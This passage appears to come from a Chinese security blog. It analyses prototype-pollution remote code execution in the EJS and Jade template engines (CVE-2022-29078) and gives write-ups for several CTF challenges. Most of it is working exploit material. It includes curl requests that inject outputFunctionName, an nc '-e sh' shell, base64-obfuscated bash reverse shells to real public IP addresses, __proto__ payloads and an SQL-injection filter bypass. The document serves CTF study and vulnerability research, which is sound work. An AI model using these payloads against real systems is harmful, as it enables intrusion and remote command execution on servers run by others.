running on ${PORT}`); }); index.js\n1 2 3 4 5 6 7 8 9 10 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Lab CVE-2022-29078\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h2\u0026gt;CVE-2022-29078\u0026lt;/h2\u0026gt; \u0026lt;%= test %\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 漏洞代码\n我们查看 Node_Modules 的 ejs/lib/ejs.js 文件，我们可以看到以下代码部分。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 /** * Render an EJS file at the given `path` and callback `cb(err, str)`. * * If you would like to include options but not data, you need to explicitly * call this function with `data` being an empty object or `null`. * * @param {String} path path to the EJS file * @param {Object} [data={}] template data * @param {Options} [opts={}] compilation and rendering options * @param {RenderFileCallback} cb callback * @public */ exports.renderFile = function () { var args = Array.prototype.slice.call(arguments); var filename = args.shift(); var cb; var opts = {filename: filename}; var data; var viewOpts; // Do we have a callback? if (typeof arguments[arguments.length - 1] == \u0026#39;function\u0026#39;) { cb = args.pop(); } // Do we have data/opts? if (args.length) { // Should always have data obj data = args.shift(); // Normal passed opts (data obj + opts obj) if (args.length) { // Use shallowCopy so we don\u0026#39;t pollute passed in opts obj with new vals utils.shallowCopy(opts, args.pop()); } // Special casing for Express (settings + opts-in-data) else { // Express 3 and 4 if (data.settings) { // Pull a few things from known locations if (data.settings.views) { opts.views = data.settings.views; } if (data.settings[\u0026#39;view cache\u0026#39;]) { opts.cache = true; } // Undocumented after Express 2, but still usable, esp. for // items that are unsafe to be passed along with data, like `root` viewOpts = data.settings[\u0026#39;view options\u0026#39;]; if (viewOpts) { utils.shallowCopy(opts, viewOpts); } } // Express 2 and lower, values set in app.locals, or people who just // want to pass options in their data. NOTE: These values will override // anything previously set in settings or settings[\u0026#39;view options\u0026#39;] utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA_EXPRESS); } opts.filename = filename; } else { data = {}; } return tryHandleCache(opts, data, cb); }; 关键在这里\n1 2 3 4 5 6 7 8 9 10 ... if (args.length) { // Should always have data obj data = args.shift(); // Normal passed opts (data obj + opts obj) if (args.length) { // Use shallowCopy so we don\u0026#39;t pollute passed in opts obj with new vals utils.shallowCopy(opts, args.pop()); } ... data=args.shift()可以查看是否输入了该值curl \u0026quot;127.0.0.1:3000?test=AAAA\u0026quot;，如果发送curl请求，通过debug试一下，data可以检查用户输入的参数test和值是否在里面输入。AAAA\n1 2 settings: test:\u0026#39;AAAA\u0026#39; 接下来这一段\n1 2 3 4 5 6 ... viewOpts = data.settings[\u0026#39;view options\u0026#39;]; if (viewOpts) { utils.shallowCopy(opts, viewOpts); } ... 因为这个位置data是test传入的内容，所以data我们间接可控，所以我们可以强行插入setting['view options']来设置\ncurl \u0026quot;127.0.0.1:3000?test=AAAA\u0026amp;settings\\[view%20options\\]\\[A\\]=BBBB\u0026quot; 1 2 settings: view options:{A:BBBB} 跟进shallowCopy函数\n1 2 3 4 5 6 7 exports.shallowCopy = function (to, from) { from = from || {}; for (var p in from) { to[p] = from[p]; } return to; }; 取出第二个输入自变量的元素，并将使用该元素的数组的值存储在具有与第一个自变量相同的元素的数组中，有点像merge函数。这里面的两个参数to就是opts，from就是我们能够控制的viewOpts，这让就将viewOpts里面的A：BBBB给了opts\n用户可以操纵第一个参数。调用的变量在本文中opts作为第一个参数传递，opts稍后在以下函数中使用该变量。\n1 2 3 4 5 6 7 8 9 10 if (!this.source) { this.generateSource(); prepended += \u0026#39; var __output = \u0026#34;\u0026#34;;\\n\u0026#39; + \u0026#39; function __append(s) { if (s !== undefined \u0026amp;\u0026amp; s !== null) __output += s }\\n\u0026#39;; if (opts.outputFunctionName) { prepended += \u0026#39; var \u0026#39; + opts.outputFunctionName + \u0026#39; = __append;\u0026#39; + \u0026#39;\\n\u0026#39;; } if (opts.destructuredLocals \u0026amp;\u0026amp; opts.destructuredLocals.length) { ... 从代码中可以看出，opts将outputFunctionName的元素值取出prepended并放入 中，对应的值后面作为连接其他值的代码执行。由于用户opts可以操纵 ，outputFunctionName所以值也可以被调制，并且可以通过 RCE 生成想要的值。\ncurl \u0026quot;127.0.0.1:3000?test=AAAA\u0026amp;settings\\[view%20options\\]\\[outputFunctionName\\]=x;console.log('Hacked');x\u0026quot;\nPOC 1 curl \u0026#34;127.0.0.1:3000?test=AAAA\u0026amp;settings\\[view%20options\\]\\[outputFunctionName\\]=x;process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;nc%20127.0.0.1%208862%20-e%20sh\u0026#39;);x\u0026#34; 原型链污染分析方式 Ejs.js\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 var express = require(\u0026#39;express\u0026#39;); var lodash = require(\u0026#39;lodash\u0026#39;); var ejs = require(\u0026#39;ejs\u0026#39;); var app = express(); //设置模板的位置与种类 app.set(\u0026#39;views\u0026#39;, __dirname); app.set(\u0026#39;views engine\u0026#39;,\u0026#39;ejs\u0026#39;); //对原型进行污染 var malicious_payload = \u0026#39;{\u0026#34;__proto__\u0026#34;:{\u0026#34;outputFunctionName\u0026#34;:\u0026#34;_tmp1;global.process.mainModule.require(\\\u0026#39;child_process\\\u0026#39;).exec(\\\u0026#39;calc\\\u0026#39;);var __tmp2\u0026#34;}}\u0026#39;; lodash.merge({}, JSON.parse(malicious_payload)); //进行渲染 app.get(\u0026#39;/\u0026#39;, function (req, res) { res.render (\u0026#34;index.ejs\u0026#34;,{ message: \u0026#39;Ic4_F1ame\u0026#39; }); }); //设置http var server = app.listen(8000, function () { var host = server.address().address var port = server.address().port console.log(\u0026#34;应用实例，访问地址为 http://%s:%s\u0026#34;, host, port) }); index.js\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;\u0026lt;%= message%\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 成功弹计算器\n分析 在res.render处下断点 进入到response.js，到1039行的app.render函数 1 app.render(view,opts,done) 继续跟进到application.js，到render函数，函数的最后一行tryRender 1 tryRender(view,renderOptions,done) 到同文件application.js中的tryRender函数，调用了view.render(options, callback); 1 2 3 4 5 6 7 8 function tryRender(view,renderOptions,done){ try{ view.render(options,callback); } catch(err){ callback(err) } } 跟进render函数，到view.js的render函数，这里调用this.engine。 跟进this.engine(this.path, options, callback);，从这里进入到了模板渲染引擎 ejs.js 中\n1 return tryHandleCache(opt,data,cb); 跟进tryHandleCache，调用handleCache方法，传data参数\n1 2 3 try{ result = handleCache(options)=(data); } 跟进handleCache，调用渲染模板的compile方法\n1 func = exports. compile(template,options); 跟进compile方法，调用templ.compile()，这个函数存在大量的渲染拼接，==其中会判断opts.outputFunctionName是否存在，这也是我们为什么要污染outputFunctionName属性的缘故==，判断成功会将outputFunctionName拼接到prepended中。\n而prepended 在最后会被传递给 this.source并被带入函数执行\n1 2 3 4 5 6 7 8 9 10 11 12 compile:function(){ …… if(!this.source){ this.generateSource(); prepended += \u0026#39; var __output = \u0026#34;\u0026#34;;\\n\u0026#39;+ \u0026#39; function __append(s) { if (s !== undefined \u0026amp;\u0026amp; s !== null) __output +=s }\\n\u0026#39;; if(opts.outputFunctionName){ prepended += \u0026#39; var \u0026#39; + opts.outputFunctionName + \u0026#39; =__append;\u0026#39; + \u0026#39;\\n\u0026#39;; } } } 常用POC 1 2 3 4 5 {\u0026#34;__proto__\u0026#34;:{\u0026#34;outputFunctionName\u0026#34;:\u0026#34;_tmp1;global.process.mainModule.require(\\\u0026#39;child_process\\\u0026#39;).execSync(\u0026#39;calc\u0026#39;);var __tmp2\u0026#34;}} {\u0026#34;__proto__\u0026#34;:{\u0026#34;outputFunctionName\u0026#34;:\u0026#34;_tmp1;global.process.mainModule.require(\\\u0026#39;child_process\\\u0026#39;).exec(\u0026#39;calc\u0026#39;);var __tmp2\u0026#34;}} {\u0026#34;__proto__\u0026#34;:{\u0026#34;outputFunctionName\u0026#34;:\u0026#34;_tmp1;global.process.mainModule.require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;bash -c \\\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/120.77.200.94/8888 0\u0026gt;\u0026amp;1\\\u0026#34;\u0026#39;);var __tmp2\u0026#34;}} [GKCTF 2021]easynode 源码审计\n先看/login路由\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 app.post(\u0026#39;/login\u0026#39;,function(req,res,next){ let username = req.body.username; let password = req.body.password; safeQuery(username,password).then( result =\u0026gt;{ if(result[0]){ const token = generateToken(username) res.json({ \u0026#34;msg\u0026#34;:\u0026#34;yes\u0026#34;,\u0026#34;token\u0026#34;:token }); } else{ res.json( {\u0026#34;msg\u0026#34;:\u0026#34;username or password wrong\u0026#34;} ); } } ).then(close()).catch(err=\u0026gt;{res.json({\u0026#34;msg\u0026#34;:\u0026#34;something wrong!\u0026#34;});}); }) 跟进safeQuery函数，看到waf\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 let safeQuery = async (username,password)=\u0026gt;{ const waf = (str)=\u0026gt;{ blacklist = [\u0026#39;\\\\\u0026#39;,\u0026#39;\\^\u0026#39;,\u0026#39;)\u0026#39;,\u0026#39;(\u0026#39;,\u0026#39;\\\u0026#34;\u0026#39;,\u0026#39;\\\u0026#39;\u0026#39;] blacklist.forEach(element =\u0026gt; { if (str == element){ str = \u0026#34;*\u0026#34;; } }); return str; } const safeStr = (str)=\u0026gt;{ for(let i = 0;i \u0026lt; str.length;i++){ if (waf(str[i]) ==\u0026#34;*\u0026#34;){ str = str.slice(0, i) + \u0026#34;*\u0026#34; + str.slice(i + 1, str.length); } } return str; } username = safeStr(username); password = safeStr(password); let sql = format(\u0026#34;select * from test where username = \u0026#39;{}\u0026#39; and password = \u0026#39;{}\u0026#39;\u0026#34;,username.substr(0,20),password.substr(0,20)); result = JSON.parse(JSON.stringify(await select(sql))); return result; } 可以发现这里是一个waf，用于防止sql注入中的单双引号闭合：定义了waf对传入的username和password进行遍历然后将黑名单里的东西进行替换，然后再将str进行拼接，将非法字符替换成*然后拼接两边的东西，这个地方对传入的字符串用数组str[i]逐个进行遍历\n所以我们可以用数组进行绕过：username[str1,str2,str3]对应的就是：username遍历数组里面的键值，所以我们就可以绕过他的单个遍历，直接让字符串等于*（显然不相等）\n但是依然不能够注入到sql语句当中：因为\n1 let sql = format(\u0026#34;select * from test where username = \u0026#39;{}\u0026#39; and password = \u0026#39;{}\u0026#39;\u0026#34;,username.substr(0,20),password.substr(0,20)); 这里substr只能对字符串进行使用，而数组不能够使用，所以没法将其注入到sql语句当中\n注意到这个函数\n1 2 3 4 5 6 7 8 9 const safeStr = (str)=\u0026gt;{ for(let i = 0;i \u0026lt; str.length;i++){ if (waf(str[i]) ==\u0026#34;*\u0026#34;){ str = str.slice(0, i) + \u0026#34;*\u0026#34; + str.slice(i + 1, str.length); } } return str; } 他会将匹配到的恶意字符变成*然后前后拼接，形成一个字符串类型，所以我们只要能够在后面构造出一个非法字符，就可以将数组再次转化为字符串。\n本地调试一下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 const express = require(\u0026#39;express\u0026#39;); const format = require(\u0026#39;string-format\u0026#39;); const app = new express(); var extend = require(\u0026#34;js-extend\u0026#34;).extend const ejs = require(\u0026#39;ejs\u0026#39;); let safeQuery = async (username,password)=\u0026gt;{ const waf = (str)=\u0026gt;{ blacklist = [\u0026#39;\\\\\u0026#39;,\u0026#39;\\^\u0026#39;,\u0026#39;)\u0026#39;,\u0026#39;(\u0026#39;,\u0026#39;\\\u0026#34;\u0026#39;,\u0026#39;\\\u0026#39;\u0026#39;] blacklist.forEach(element =\u0026gt; { if (str == element){ str = \u0026#34;*\u0026#34;; } }); return str; } const safeStr = (str)=\u0026gt;{ for(let i = 0;i \u0026lt; str.length;i++){ if (waf(str[i]) ==\u0026#34;*\u0026#34;){ str = str.slice(0, i) + \u0026#34;*\u0026#34; + str.slice(i + 1, str.length); } } return str; } username = safeStr(username); password = safeStr(password); let sql = format(\u0026#34;select * from test where username = \u0026#39;{}\u0026#39; and password = \u0026#39;{}\u0026#39;\u0026#34;,username.substr(0,20),password.substr(0,20)); result = JSON.parse(JSON.stringify(sql)); return result; } console.log(safeQuery([\u0026#34;admin\u0026#39;#\u0026#34;,1,1,1,1,1,\u0026#39;)\u0026#39;],\u0026#34;123456\u0026#34;)); 所以我们的payload就是\n1 username[]=admin\u0026#39;#\u0026amp;username[]=1\u0026amp;username[]=1\u0026amp;username[]=1\u0026amp;username[]=1\u0026amp;username[]=1\u0026amp;username[]=1\u0026amp;username[]=1\u0026amp;username[]=1\u0026amp;username[]=(\u0026amp;password=123456 接着看/adminDIV路由\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 app.post(\u0026#34;/adminDIV\u0026#34;,async(req,res,next) =\u0026gt;{ const token = req.cookies.token var data = JSON.parse(req.body.data) let result = verifyToken(token); if(result !=\u0026#39;err\u0026#39;){ username = result; var sql =`select board from board where username = \u0026#34;${username}\u0026#34;`; var query = JSON.parse(JSON.stringify(await select(sql).then(close().catch( (err)=\u0026gt;{console.log(err);} )))); board = JSON.parse(JSON.stringify(query[0].board)); for(var key in data){ var addDIV =`{\u0026#34;${username}\u0026#34;:{\u0026#34;${key}\u0026#34;:\u0026#34;${(data[key])}\u0026#34;}}`; extend({},JSON.parse(addDIV)); } sql = `update board SET board = \u0026#39;${JSON.stringify(board)}\u0026#39; where username = \u0026#39;${username}\u0026#39;` select(sql).then(close()).catch( ()=\u0026gt;{res.json({\u0026#34;msg\u0026#34;:\u0026#39;DIV ERROR?\u0026#39;});}); res.json({\u0026#34;msg\u0026#34;:\u0026#39;addDiv successful!!!\u0026#39;}); } else{ res.end(\u0026#39;nonono\u0026#39;); } }); 存在键值操作的代码，可能可以原型链污染\n这个地方拿取了cookie的值，将post的内容以json形式传递给data，然后调用verifyToken函数验证token的有效性并将结果返回给result，如果验证通过就进入if语句当中，然后将用户名保存在变量username中，构建一个sql查询语句，从board中获取对应用户的数据\n1 2 3 4 5 // 调用 select 函数执行 SQL 查询，将结果转换为 JSON 格式 var query = JSON.parse(JSON.stringify(await select(sql).then(close().catch( (err)=\u0026gt;{console.log(err);} )))); // 从查询结果中获取该用户的布局数据 board = JSON.parse(JSON.stringify(query[0].board)); 我们跟进extend函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 var extend = function(obj) { if(typeof obj !== \u0026#39;object\u0026#39;) throw obj + \u0026#39; is not an object\u0026#39; ; var sources = slice.call(arguments, 1); each.call(sources, function(source) { if(source) { for(var prop in source) { if(typeof source[prop] === \u0026#39;object\u0026#39; \u0026amp;\u0026amp; obj[prop]) { extend.call(obj, obj[prop], source[prop]); } else { obj[prop] = source[prop]; } } } }); return obj; } 本质上就是merge函数，可以原型链污染\n1 2 3 4 for(var key in data){ var addDIV =`{\u0026#34;${username}\u0026#34;:{\u0026#34;${key}\u0026#34;:\u0026#34;${(data[key])}\u0026#34;}}`; extend({},JSON.parse(addDIV)); } 这里我们可以在addAdmin路由添加username为__proto__,然后重新登入拿token,后面用上面的poc就能弹shell了,用post传给data\n1 {\u0026#34;outputFunctionName\u0026#34;:\u0026#34;_tmp1;global.process.mainModule.require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;bash -c \\\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/47.122.53.248/2333 0\u0026gt;\u0026amp;1\\\u0026#34;\u0026#39;);var __tmp2\u0026#34;} 因为这里是post传参，不是JSON，所以我们要对反弹shell的地方进行base64编码然后再解码，以免出现控制字符的干扰：\n1 {\u0026#34;outputFunctionName\u0026#34;:\u0026#34;_tmp1;global.process.mainModule.require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;echo YmFzaCAtYyBcImJhc2ggLWkgPiYgL2Rldi90Y3AvNDcuMTIyLjUzLjI0OC8yMzMzIDA+JjFcIg==|base64 -d|bash\u0026#39;);var __tmp2\u0026#34;} 然后再访问/admin路由触发污染，就能弹shell了\n这题用反斜杠转义会失败我们换成没反斜杠的(没绷住是base64编码的+号问题，再套一层url编码就行了)\n1 {\u0026#34;outputFunctionName\u0026#34;:\u0026#34;_tmp1;global.process.mainModule.require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMjIuNTMuMjQ4LzIzMzMgMD4mMSI=|base64 -d|bash\u0026#39;);var __tmp2\u0026#34;}//bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/47.122.53.248/2333 0\u0026gt;\u0026amp;1\u0026#34; 用url编码一下\n1 {\u0026#34;outputFunctionName\u0026#34;:\u0026#34;_tmp1;global.process.mainModule.require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;echo YmFzaCAtYyAiYmFzaCAtaSA%2BJiAvZGV2L3RjcC80Ny4xMjIuNTMuMjQ4LzIzMzMgMD4mMSI%3D|base64 -d|bash\u0026#39;);var __tmp2\u0026#34;} 其他链子实现RCE 参考：关于nodejs的ejs和jade模板引擎的原型链污染挖掘-安全KER - 安全资讯平台\n1 2 3 4 5 6 7 8 9 var escapeFn = opts.escapeFunction; var ctor; ... if (opts.client) { src = \u0026#39;escapeFn = escapeFn || \u0026#39; + escapeFn.toString() + \u0026#39;;\u0026#39; + \u0026#39;\\n\u0026#39; + src; if (opts.compileDebug) { src = \u0026#39;rethrow = rethrow || \u0026#39; + rethrow.toString() + \u0026#39;;\u0026#39; + \u0026#39;\\n\u0026#39; + src; } } 同样控制opts里面的escapeFunction就能RCE\nPOC\n1 2 3 {\u0026#34;__proto__\u0026#34;:{\u0026#34;__proto__\u0026#34;:{\u0026#34;client\u0026#34;:true,\u0026#34;escapeFunction\u0026#34;:\u0026#34;1; return global.process.mainModule.constructor._load(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;dir\u0026#39;);\u0026#34;,\u0026#34;compileDebug\u0026#34;:true}}} {\u0026#34;__proto__\u0026#34;:{\u0026#34;__proto__\u0026#34;:{\u0026#34;client\u0026#34;:true,\u0026#34;escapeFunction\u0026#34;:\u0026#34;1; return global.process.mainModule.constructor._load(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;dir\u0026#39;);\u0026#34;,\u0026#34;compileDebug\u0026#34;:true,\u0026#34;debug\u0026#34;:true}}} 添加 \u0026quot;debug\u0026quot;:true 污染时可以在调试时候看到自己赋值的命令\n在ejs模板还有三个参数可以利用，分别为 opts.localsName 和 opts.destructuredLocals 和 opts.filename, 但是这三个无法构建出合适的污染链\n有一处调用 localsName, 污染会报错\n1 fn = new ctor(opts.localsName + \u0026#39;, escapeFn, include, rethrow\u0026#39;, src); 污染 destructuredLocals\n1 2 3 4 5 6 7 8 9 10 11 if (opts.destructuredLocals \u0026amp;\u0026amp; opts.destructuredLocals.length) { var destructuring = \u0026#39; var __locals = (\u0026#39; + opts.localsName + \u0026#39; || {}),\\n\u0026#39;; for (var i = 0; i \u0026lt; opts.destructuredLocals.length; i++) { var name = opts.destructuredLocals[i]; if (i \u0026gt; 0) { destructuring += \u0026#39;,\\n \u0026#39;; } destructuring += name + \u0026#39; = __locals.\u0026#39; + name; } prepended += destructuring + \u0026#39;;\\n\u0026#39;; } 作为数组不太好处理\n污染 filename 被 JSON.stringify 进行转换了, 无法逃逸出来, 因此也无法污染函数代码\n1 2 3 4 5 6 7 8 9 10 11 if (opts.compileDebug) { src = \u0026#39;var __line = 1\u0026#39; + \u0026#39;\\n\u0026#39; + \u0026#39; , __lines = \u0026#39; + JSON.stringify(this.templateText) + \u0026#39;\\n\u0026#39; + \u0026#39; , __filename = \u0026#39; + (opts.filename ? JSON.stringify(opts.filename) : \u0026#39;undefined\u0026#39;) + \u0026#39;;\u0026#39; + \u0026#39;\\n\u0026#39; + \u0026#39;try {\u0026#39; + \u0026#39;\\n\u0026#39; + this.source + \u0026#39;} catch (e) {\u0026#39; + \u0026#39;\\n\u0026#39; + \u0026#39; rethrow(e, __lines, __filename, __line, escapeFn);\u0026#39; + \u0026#39;\\n\u0026#39; + \u0026#39;}\u0026#39; + \u0026#39;\\n\u0026#39;; } 但是我发现destructuredLocals其实是可以用的\n[ISCTF2024]ezejs 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 const express = require(\u0026#39;express\u0026#39;); const app = express(); app.use(express.json()); app.set(\u0026#39;view engine\u0026#39;, \u0026#39;ejs\u0026#39;); app.set(\u0026#39;env\u0026#39;, \u0026#39;development\u0026#39;); app.set(\u0026#39;views\u0026#39;, \u0026#39;./views\u0026#39;); users={\u0026#34;guest\u0026#34;:\u0026#34;123456\u0026#34;} function copy(object1, object2){ for (let key in object2) { if (key in object2 \u0026amp;\u0026amp; key in object1) { copy(object1[key], object2[key]) } else { object1[key] = object2[key] } } } // 首页展示 app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { res.render(\u0026#39;index\u0026#39;); }); // backdoor app.post(\u0026#39;/UserList\u0026#39;,(req,res) =\u0026gt; { user = req.body const blacklist = [\u0026#39;\\\\u\u0026#39;,\u0026#39;outputFunctionName\u0026#39;,\u0026#39;localsName\u0026#39;,\u0026#39;escape\u0026#39;] const hacker = JSON.stringify(user) for (const pattern of blacklist){ if(hacker.includes(pattern)){ res.status(200).json({\u0026#34;message\u0026#34;:\u0026#34;hacker!\u0026#34;}); return } } copy(users,user); res.status(200).json(user); }); // 启动服务器 app.listen(80, () =\u0026gt; { console.log(`Server running at http://localhost:80`); }); 同目录下views文件夹下还有index.ejs,我们只需要污染flag写入index.ejs就能在根目录下看到flag\n过滤了outputFunctionName和escape,这里就用到前面的destructuredLocals\n跟outputFunctionName一样的payload就能污染了\n1 {\u0026#34;__proto__\u0026#34;:{\u0026#34;destructuredLocals\u0026#34;:[\u0026#34;_tmp1;global.process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;cat /flag \u0026gt;./views/index.ejs\u0026#39;);var __tmp2\u0026#34;]}} jade模板引擎RCE 原型链的污染思路和 ejs 思路很像, 从 require('jade').__express 进入 jade/lib/index.js\n1 2 3 4 5 6 exports.__express = function(path, options, fn) { if(options.compileDebug == undefined \u0026amp;\u0026amp; process.env.NODE_ENV === \u0026#39;production\u0026#39;) { options.compileDebug = false; } exports.renderFile(path, options, fn); } 跟进 renderFile 函数\n1 2 3 4 exports.renderFile = function(path, options, fn){ ... return handleTemplateCache(options)(options); }; 返回的时候进入了 handleTemplateCache 函数, 跟进\n会进入 complie 方法, 跟进\njade 模板和 ejs 不同, 在compile之前会有 parse 解析, 尝试控制传入 parse 的语句\n在 parse 函数中主要执行了这两步, 最后返回的部分\n1 2 3 4 5 6 7 8 9 var body = \u0026#39;\u0026#39; + \u0026#39;var buf = [];\\n\u0026#39; + \u0026#39;var jade_mixins = {};\\n\u0026#39; + \u0026#39;var jade_interp;\\n\u0026#39; + (options.self ? \u0026#39;var self = locals || {};\\n\u0026#39; + js : addWith(\u0026#39;locals || {}\u0026#39;, \u0026#39;\\n\u0026#39; + js, globals)) + \u0026#39;;\u0026#39; + \u0026#39;return buf.join(\u0026#34;\u0026#34;);\u0026#39;; return {body: body, dependencies: parser.dependencies}; options.self 可控, 可以绕过 addWith 函数, 回头跟进 compile 函数, 看看作用\n返回的是 buf,跟进 visit 函数,如果 debug 为 true, node.line 就会被 push 进去, 造成拼接 (两个参数)\n1 2 jade_debug.unshift(new jade.DebugItem( 0, \u0026#34;\u0026#34; ));return global.process.mainModule.constructor._load(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;dir\u0026#39;);// // 注释符注释掉后面的语句 在返回的时候还会经过 visitNode 函数\n1 2 visitNode: function(node){ return this[\u0026#39;visit\u0026#39; + node.type](node);} 然后就可以返回 buf 部分进行命令执行\nPOC\n1 {\u0026#34;__proto__\u0026#34;:{\u0026#34;__proto__\u0026#34;: {\u0026#34;type\u0026#34;:\u0026#34;Code\u0026#34;,\u0026#34;compileDebug\u0026#34;:true,\u0026#34;self\u0026#34;:true,\u0026#34;line\u0026#34;:\u0026#34;0, \\\u0026#34;\\\u0026#34; ));return global.process.mainModule.constructor._load(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;dir\u0026#39;);//\u0026#34;}}} 补充: 针对 jade RCE链的污染, 普通的模板可以只需要污染 self 和 line, 但是有继承的模板还需要污染 type\n最后文章还贴了个poc生成脚本：[Rickyweb/nodejs/Prototype chain pollution/nodejs.py at main · R1ckyZ/Rickyweb · GitHub](https://github.com/R1ckyZ/Rickyweb/blob/main/nodejs/Prototype chain pollution/nodejs.py)，看了眼源码感觉没什么用\n[CISCN2024 ezjs] app.js\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 const express = require(\u0026#39;express\u0026#39;); const ejs=require(\u0026#39;ejs\u0026#39;) const session = require(\u0026#39;express-session\u0026#39;); const bodyParse = require(\u0026#39;body-parser\u0026#39;); const multer = require(\u0026#39;multer\u0026#39;); const fs = require(\u0026#39;fs\u0026#39;); const path = require(\u0026#34;path\u0026#34;); function createDirectoriesForFilePath(filePath) { const dirname = path.dirname(filePath); fs.mkdirSync(dirname, { recursive: true }); } function IfLogin(req, res, next){ if (req.session.user!=null){ next() }else { res.redirect(\u0026#39;/login\u0026#39;) } } const storage = multer.diskStorage({ destination: function (req, file, cb) { cb(null, path.join(__dirname, \u0026#39;uploads\u0026#39;)); // 设置上传文件的目标目录 }, filename: function (req, file, cb) { // 直接使用原始文件名 cb(null, file.originalname); } }); // 配置 multer 上传中间件 const upload = multer({ storage: storage, // 使用自定义存储选项 fileFilter: (req, file, cb) =\u0026gt; { const fileExt = path.extname(file.originalname).toLowerCase(); if (fileExt === \u0026#39;.ejs\u0026#39;) { // 如果文件后缀为 .ejs，则拒绝上传该文件 return cb(new Error(\u0026#39;Upload of .ejs files is not allowed\u0026#39;), false); } cb(null, true); // 允许上传其他类型的文件 } }); admin={ \u0026#34;username\u0026#34;:\u0026#34;ADMIN\u0026#34;, \u0026#34;password\u0026#34;:\u0026#34;123456\u0026#34; } app=express() app.use(express.static(path.join(__dirname, \u0026#39;uploads\u0026#39;))); app.use(express.json()); app.use(bodyParse.urlencoded({extended: false})); app.set(\u0026#39;view engine\u0026#39;, \u0026#39;ejs\u0026#39;); app.use(session({ secret: \u0026#39;Can_U_hack_me?\u0026#39;, resave: false, saveUninitialized: true, cookie: { maxAge: 3600 * 1000 } })); app.get(\u0026#39;/\u0026#39;,(req,res)=\u0026gt;{ res.redirect(\u0026#39;/login\u0026#39;) }) app.get(\u0026#39;/login\u0026#39;, (req, res) =\u0026gt; { res.render(\u0026#39;login\u0026#39;); }); app.post(\u0026#39;/login\u0026#39;, (req, res) =\u0026gt; { const { username, password } = req.body; if (username === \u0026#39;admin\u0026#39;){ return res.status(400).send(\u0026#39;you can not be admin\u0026#39;); } const new_username = username.toUpperCase() if (new_username === admin.username \u0026amp;\u0026amp; password === admin.password) { req.session.user = \u0026#34;ADMIN\u0026#34;; res.redirect(\u0026#39;/rename\u0026#39;); } else { // res.redirect(\u0026#39;/login\u0026#39;); } }); app.get(\u0026#39;/upload\u0026#39;, (req, res) =\u0026gt; { res.render(\u0026#39;upload\u0026#39;); }); app.post(\u0026#39;/upload\u0026#39;, upload.single(\u0026#39;fileInput\u0026#39;), (req, res) =\u0026gt; { if (!req.file) { return res.status(400).send(\u0026#39;No file uploaded\u0026#39;); } const fileExt = path.extname(req.file.originalname).toLowerCase(); if (fileExt === \u0026#39;.ejs\u0026#39;) { return res.status(400).send(\u0026#39;Upload of .ejs files is not allowed\u0026#39;); } res.send(\u0026#39;File uploaded successfully: \u0026#39; + req.file.originalname); }); app.get(\u0026#39;/render\u0026#39;,(req, res) =\u0026gt; { const { filename } = req.query; if (!filename) { return res.status(400).send(\u0026#39;Filename parameter is required\u0026#39;); } const filePath = path.join(__dirname, \u0026#39;uploads\u0026#39;, filename); if (filePath.endsWith(\u0026#39;.ejs\u0026#39;)) { return res.status(400).send(\u0026#39;Invalid file type.\u0026#39;); } res.render(filePath); }); app.get(\u0026#39;/rename\u0026#39;,IfLogin, (req, res) =\u0026gt; { if (req.session.user !== \u0026#39;ADMIN\u0026#39;) { return res.status(403).send(\u0026#39;Access 